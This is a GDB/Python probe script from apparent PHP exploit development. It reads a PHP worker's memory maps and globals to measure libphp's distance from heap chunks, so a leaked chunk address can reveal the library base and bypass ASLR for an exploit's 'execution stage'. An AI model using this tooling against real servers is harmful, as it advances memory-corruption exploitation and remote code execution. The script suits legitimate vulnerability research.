# delta_probe.gdb - libphp base relative to the heap, without leaking a module pointer.
#
# The leak gives chunk addresses; the execution stage needs the libphp load base. Instead of hoping a
# module pointer lands inside the disclosed window, this measures the *relationship*: where libphp was
# mapped relative to the chunk the stale session id lives in, and relative to the main chunk. If that
# distance is stable for a given image and startup, the base follows from a leaked chunk base with one
# calibrated constant - which is exactly what the reference's own delta_probe.gdb records.
#
#   sudo gdb -q -batch -p <worker> -x gdb/delta_probe.gdb
set pagination off
set confirm off
set width 0

python
import gdb

PS_ID = 0x10


def mem(addr, size):
    try:
        return gdb.selected_inferior().read_memory(addr, size).tobytes()
    except Exception:
        return None


def q(addr, size=8):
    raw = mem(addr, size)
    return None if raw is None else int.from_bytes(raw, "little")


def module_range(pid, needle="libphp"):
    lo = hi = 0
    try:
        with open("/proc/%d/maps" % pid) as fh:
            for line in fh:
                if needle not in line:
                    continue
                start, _, end = line.split()[0].partition("-")
                s, e = int(start, 16), int(end, 16)
                lo = s if not lo or s < lo else lo
                hi = max(hi, e)
    except OSError:
        pass
    return lo, hi


def main_chunk():
    """alloc_globals starts with the heap pointer; the main chunk is that pointer masked."""
    try:
        ag = int(gdb.parse_and_eval("(unsigned long)&alloc_globals"))
    except Exception:
        return 0
    heap = q(ag) or 0
    return heap & ~0x1FFFFF


pid = gdb.selected_inferior().pid
lo, hi = module_range(pid)
try:
    ps = int(gdb.parse_and_eval("(unsigned long)&ps_globals"))
    psid = q(ps + PS_ID) or 0
except Exception:
    psid = 0
try:
    z = int(gdb.parse_and_eval("(unsigned long)&zval_ptr_dtor"))
except Exception:
    z = 0
idchunk = psid & ~0x1FFFFF if psid else 0
main = main_chunk()
print("[dp] libphp=%#x-%#x zval_ptr_dtor=%#x (lib+%#x)"
      % (lo, hi, z, (z - lo) if z and lo else 0))
print("[dp] PS(id)=%#x idchunk=%#x mainchunk=%#x" % (psid, idchunk, main))
if lo and idchunk:
    print("[dp] DELTA lib-idchunk=%#x (%d pages)  lib-main=%#x (%d pages)"
          % ((lo - idchunk) & 0xFFFFFFFFFFFFFFFF, (lo - idchunk) >> 12,
             (lo - main) & 0xFFFFFFFFFFFFFFFF, (lo - main) >> 12))
end
